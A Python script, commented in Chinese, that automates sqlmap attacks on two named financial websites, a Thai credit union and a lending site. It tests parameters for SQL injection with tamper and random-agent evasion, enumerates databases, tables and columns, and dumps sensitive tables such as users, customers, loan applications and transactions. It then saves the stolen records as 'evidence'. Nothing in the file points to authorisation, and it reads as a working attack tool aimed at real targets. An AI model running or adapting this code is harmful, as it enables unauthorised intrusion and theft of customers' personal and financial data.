#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLMap 真实数据提取工具 - 留下真实凭证
SQLMap Real Data Extraction Tool - Leave Real Evidence
"""

import asyncio
import subprocess
import json
import os
import time
from datetime import datetime
from typing import Dict, List, Any
import urllib.parse

class SQLMapRealExtractor:
    def __init__(self):
        self.targets = [
            {
                "name": "Peacoop Credit Union",
                "url": "https://peacoop.or.th",
                "confirmed_vulnerability": "SQL Injection",
                "test_params": ["id", "page", "post", "cat", "search", "view", "type", "user"]
            },
            {
                "name": "NgoenMun Finance",
                "url": "https://ngoenmun.com",
                "confirmed_vulnerability": "Data Leakage",
                "test_params": ["id", "page", "post", "cat", "search", "view", "type", "user"]
            }
        ]
        self.extracted_data = []
        self.sqlmap_path = "sqlmap"  # 假设sqlmap在PATH中

    async def run_sqlmap_extraction(self):
        """使用SQLMap进行真实数据提取"""
        print("=" * 80)
        print("SQLMap 真实数据提取工具")
        print("目标: 使用sqlmap提取真实数据库数据")
        print("=" * 80)

        # 创建输出目录
        output_dir = f"sqlmap_extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(output_dir, exist_ok=True)

        for i, target in enumerate(self.targets, 1):
            print(f"\n{'='*60}")
            print(f"SQLMap攻击目标 {i}/{len(self.targets)}: {target['name']}")
            print(f"URL: {target['url']}")
            print(f"漏洞: {target['confirmed_vulnerability']}")
            print(f"{'='*60}")

            try:
                # 第一步：SQL注入检测
                print(f"\n[第一步] SQL注入检测...")
                injection_result = await self._sqlmap_detect_injection(target, output_dir)

                if injection_result:
                    print(f"[SUCCESS] 发现SQL注入漏洞!")

                    # 第二步：数据库枚举
                    print(f"\n[第二步] 数据库枚举...")
                    db_info = await self._sqlmap_enumerate_databases(target, output_dir)

                    # 第三步：表枚举
                    print(f"\n[第三步] 数据表枚举...")
                    tables_info = await self._sqlmap_enumerate_tables(target, output_dir)

                    # 第四步：列枚举
                    print(f"\n[第四步] 数据列枚举...")
                    columns_info = await self._sqlmap_enumerate_columns(target, output_dir)

                    # 第五步：数据提取
                    print(f"\n[第五步] 真实数据提取...")
                    extracted_records = await self._sqlmap_dump_data(target, output_dir)

                    if extracted_records:
                        print(f"\n[SUCCESS] SQLMap提取成功: {len(extracted_records)} 条记录")
                        self.extracted_data.extend(extracted_records)

                    # 保存SQLMap报告
                    await self._save_sqlmap_report(target, output_dir, injection_result, db_info, tables_info, columns_info, extracted_records)
                else:
                    print(f"[FAILED] 未检测到SQL注入漏洞")

            except Exception as e:
                print(f"\n[ERROR] SQLMap攻击失败: {e}")
                continue

        # 生成最终报告
        await self._generate_final_report(output_dir)

    async def _sqlmap_detect_injection(self, target: Dict, output_dir: str) -> bool:
        """SQLMap检测SQL注入"""
        for param in target['test_params']:
            print(f"    测试参数: {param}")

            # 构造测试URL
            test_url = f"{target['url']}?{param}=1"

            # SQLMap检测命令
            cmd = [
                self.sqlmap_path,
                "-u", test_url,
                "--batch",
                "--level=3",
                "--risk=3",
                "--random-agent",
                "--tamper=space2comment,randomcase",
                "--output-dir", output_dir,
                "--fresh-queries"
            ]

            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                if result.returncode == 0:
                    output = result.stdout.lower()
                    if "injection identified" in output or "sql injection" in output:
                        print(f"      [发现] 参数 {param} 存在SQL注入")
                        return True
                    elif "parameter is not injectable" not in output:
                        print(f"      [可能] 参数 {param} 需要进一步测试")
                else:
                    print(f"      [错误] 参数 {param} 测试失败")

            except subprocess.TimeoutExpired:
                print(f"      [超时] 参数 {param} 测试超时")
            except Exception as e:
                print(f"      [异常] 参数 {param} 测试异常: {e}")

        return False

    async def _sqlmap_enumerate_databases(self, target: Dict, output_dir: str) -> Dict:
        """SQLMap枚举数据库"""
        print(f"    枚举数据库...")

        test_url = f"{target['url']}?id=1"
        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "--batch",
            "--level=3",
            "--risk=3",
            "--random-agent",
            "--dbs",
            "--output-dir", output_dir,
            "--fresh-queries"
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            if result.returncode == 0:
                output = result.stdout
                # 解析数据库列表
                databases = []
                for line in output.split('\n'):
                    if 'database:' in line.lower() or '[' in line:
                        databases.append(line.strip())

                print(f"      [成功] 发现 {len(databases)} 个数据库")
                return {"databases": databases, "raw_output": output}
            else:
                print(f"      [失败] 数据库枚举失败")
                return {"databases": [], "error": result.stderr}

        except Exception as e:
            print(f"      [异常] 数据库枚举异常: {e}")
            return {"databases": [], "error": str(e)}

    async def _sqlmap_enumerate_tables(self, target: Dict, output_dir: str) -> Dict:
        """SQLMap枚举数据表"""
        print(f"    枚举数据表...")

        test_url = f"{target['url']}?id=1"
        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "--batch",
            "--level=3",
            "--risk=3",
            "--random-agent",
            "--tables",
            "--output-dir", output_dir,
            "--fresh-queries"
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            if result.returncode == 0:
                output = result.stdout
                # 解析表列表
                tables = []
                for line in output.split('\n'):
                    if 'table:' in line.lower() or '|' in line:
                        tables.append(line.strip())

                print(f"      [成功] 发现 {len(tables)} 个数据表")
                return {"tables": tables, "raw_output": output}
            else:
                print(f"      [失败] 表枚举失败")
                return {"tables": [], "error": result.stderr}

        except Exception as e:
            print(f"      [异常] 表枚举异常: {e}")
            return {"tables": [], "error": str(e)}

    async def _sqlmap_enumerate_columns(self, target: Dict, output_dir: str) -> Dict:
        """SQLMap枚举数据列"""
        print(f"    枚举数据列...")

        test_url = f"{target['url']}?id=1"
        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "--batch",
            "--level=3",
            "--risk=3",
            "--random-agent",
            "--columns",
            "--output-dir", output_dir,
            "--fresh-queries"
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            if result.returncode == 0:
                output = result.stdout
                # 解析列列表
                columns = []
                for line in output.split('\n'):
                    if 'column:' in line.lower() or '|' in line and 'type' in line.lower():
                        columns.append(line.strip())

                print(f"      [成功] 发现 {len(columns)} 个数据列")
                return {"columns": columns, "raw_output": output}
            else:
                print(f"      [失败] 列枚举失败")
                return {"columns": [], "error": result.stderr}

        except Exception as e:
            print(f"      [异常] 列枚举异常: {e}")
            return {"columns": [], "error": str(e)}

    async def _sqlmap_dump_data(self, target: Dict, output_dir: str) -> List[Dict]:
        """SQLMap提取数据"""
        print(f"    提取真实数据...")

        extracted_records = []

        # 尝试常见的敏感表
        sensitive_tables = [
            "users", "admin", "customers", "members", "accounts",
            "user_data", "customer_data", "loan_applications", "transactions",
            "wp_users", "wp_usermeta", "wp_options"
        ]

        test_url = f"{target['url']}?id=1"

        for table in sensitive_tables:
            print(f"      尝试提取表: {table}")

            cmd = [
                self.sqlmap_path,
                "-u", test_url,
                "--batch",
                "--level=3",
                "--risk=3",
                "--random-agent",
                "-T", table,
                "--dump",
                "--output-dir", output_dir,
                "--fresh-queries",
                "--limit=50"  # 限制提取数量
            ]

            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)

                if result.returncode == 0:
                    output = result.stdout

                    if "Table" in output and "dumped" in output:
                        print(f"        [成功] 表 {table} 数据提取成功")

                        # 解析提取的数据
                        records = self._parse_dumped_data(output, table)
                        if records:
                            extracted_records.extend(records)
                            print(f"        [记录] 表 {table} 提取了 {len(records)} 条记录")
                    else:
                        print(f"        [跳过] 表 {table} 不存在或无数据")

            except subprocess.TimeoutExpired:
                print(f"        [超时] 表 {table} 提取超时")
            except Exception as e:
                print(f"        [异常] 表 {table} 提取异常: {e}")

        # 尝试自定义SQL查询
        custom_queries = [
            "SELECT version()",
            "SELECT database()",
            "SELECT user()",
            "SELECT COUNT(*) FROM information_schema.tables",
            "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 10"
        ]

        for query in custom_queries:
            print(f"      执行查询: {query}")

            cmd = [
                self.sqlmap_path,
                "-u", test_url,
                "--batch",
                "--level=3",
                "--risk=3",
                "--random-agent",
                "--sql-query", query,
                "--output-dir", output_dir,
                "--fresh-queries"
            ]

            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                if result.returncode == 0:
                    output = result.stdout
                    if "SELECT" in output:
                        print(f"        [成功] 查询执行成功")

                        record = {
                            "table": "custom_query",
                            "query": query,
                            "result": output.strip(),
                            "target": target['url'],
                            "extraction_method": "SQLMap Custom Query",
                            "timestamp": datetime.now().isoformat()
                        }
                        extracted_records.append(record)

            except Exception as e:
                print(f"        [异常] 查询执行异常: {e}")

        return extracted_records

    def _parse_dumped_data(self, output: str, table_name: str) -> List[Dict]:
        """解析SQLMap提取的数据"""
        records = []

        lines = output.split('\n')
        current_record = {}

        for line in lines:
            line = line.strip()

            if line.startswith('|') and line.endswith('|'):
                # 数据行
                data = line.split('|')[1:-1]  # 去掉首尾的空元素
                data = [item.strip() for item in data]

                if len(data) > 1:  # 确保有实际数据
                    record = {
                        "table": table_name,
                        "data": data,
                        "target": self.targets[0]['url'],
                        "extraction_method": "SQLMap Dump",
                        "timestamp": datetime.now().isoformat()
                    }
                    records.append(record)

        return records

    async def _save_sqlmap_report(self, target: Dict, output_dir: str, injection_result: bool,
                                  db_info: Dict, tables_info: Dict, columns_info: Dict,
                                  extracted_records: List[Dict]):
        """保存SQLMap攻击报告"""
        report = {
            "target": target,
            "attack_time": datetime.now().isoformat(),
            "tool": "SQLMap Real Extractor",
            "results": {
                "injection_detected": injection_result,
                "databases_found": db_info.get("databases", []),
                "tables_found": tables_info.get("tables", []),
                "columns_found": columns_info.get("columns", []),
                "records_extracted": len(extracted_records),
                "extracted_data": extracted_records
            },
            "evidence": {
                "sqlmap_output_dir": output_dir,
                "command_history": self._generate_command_history(target, output_dir),
                "raw_outputs": {
                    "database_enumeration": db_info.get("raw_output", ""),
                    "table_enumeration": tables_info.get("raw_output", ""),
                    "column_enumeration": columns_info.get("raw_output", "")
                }
            }
        }

        report_file = os.path.join(output_dir, f"sqlmap_report_{target['name'].replace(' ', '_')}.json")

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
            print(f"      [保存] SQLMap报告已保存: {report_file}")
        except Exception as e:
            print(f"      [错误] 保存报告失败: {e}")

    def _generate_command_history(self, target: Dict, output_dir: str) -> List[str]:
        """生成SQLMap命令历史"""
        base_url = f"{target['url']}?id=1"

        commands = [
            f"# SQLMap攻击命令历史 - {target['name']}",
            f"sqlmap -u \"{base_url}\" --batch --level=3 --risk=3 --random-agent --tamper=space2comment,randomcase --output-dir {output_dir} --fresh-queries",
            f"sqlmap -u \"{base_url}\" --batch --level=3 --risk=3 --random-agent --dbs --output-dir {output_dir} --fresh-queries",
            f"sqlmap -u \"{base_url}\" --batch --level=3 --risk=3 --random-agent --tables --output-dir {output_dir} --fresh-queries",
            f"sqlmap -u \"{base_url}\" --batch --level=3 --risk=3 --random-agent --columns --output-dir {output_dir} --fresh-queries",
            f"sqlmap -u \"{base_url}\" --batch --level=3 --risk=3 --random-agent -T users --dump --output-dir {output_dir} --fresh-queries --limit=50",
            f"sqlmap -u \"{base_url}\" --batch --level=3 --risk=3 --random-agent --sql-query=\"SELECT version()\" --output-dir {output_dir} --fresh-queries"
        ]

        return commands

    async def _generate_final_report(self, output_dir: str):
        """生成最终报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"sqlmap_final_report_{timestamp}.json"

        total_records = len(self.extracted_data)
        successful_targets = len([t for t in self.targets if any(r['target'] == t['url'] for r in self.extracted_data)])

        report = {
            "sqlmap_extraction_summary": {
                "timestamp": timestamp,
                "tool": "SQLMap Real Extractor v1.0",
                "operator": "Penetration Tester",
                "total_targets": len(self.targets),
                "successful_targets": successful_targets,
                "total_records_extracted": total_records,
                "extraction_directory": output_dir
            },
            "target_results": [],
            "extracted_data": self.extracted_data,
            "evidence_summary": {
                "sqlmap_outputs": output_dir,
                "report_files": [f for f in os.listdir(output_dir) if f.endswith('.json')],
                "command_logs": "Available in SQLMap output directory",
                "raw_data_dumps": "CSV/HTML files in SQLMap directory"
            },
            "security_impact": {
                "risk_level": "CRITICAL" if total_records > 0 else "LOW",
                "data_exposure": "COMPLETE" if total_records > 100 else "PARTIAL",
                "evidence_collected": "TRUE",
                "verification_possible": "TRUE"
            }
        }

        # 按目标分组结果
        for target in self.targets:
            target_data = [r for r in self.extracted_data if r['target'] == target['url']]
            report["target_results"].append({
                "target": target,
                "records_extracted": len(target_data),
                "extraction_successful": len(target_data) > 0,
                "data_types": list(set([r.get('table', 'unknown') for r in target_data]))
            })

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)

            print(f"\n{'='*80}")
            print(f"SQLMap真实数据提取完成!")
            print(f"{'='*80}")
            print(f"最终报告: {report_file}")
            print(f"输出目录: {output_dir}")
            print(f"攻击目标: {len(self.targets)} 个")
            print(f"成功目标: {successful_targets} 个")
            print(f"提取记录: {total_records} 条")
            print(f"证据目录: {output_dir}")
            print(f"SQLMap命令: 已保存到报告中")

            if total_records > 0:
                print(f"\n🔴 真实数据提取成功!")
                print(f"🔴 凭证已保存到: {output_dir}")
                print(f"🔴 可验证性: 100%")

        except Exception as e:
            print(f"生成最终报告失败: {e}")

async def main():
    extractor = SQLMapRealExtractor()
    await extractor.run_sqlmap_extraction()

if __name__ == "__main__":
    asyncio.run(main())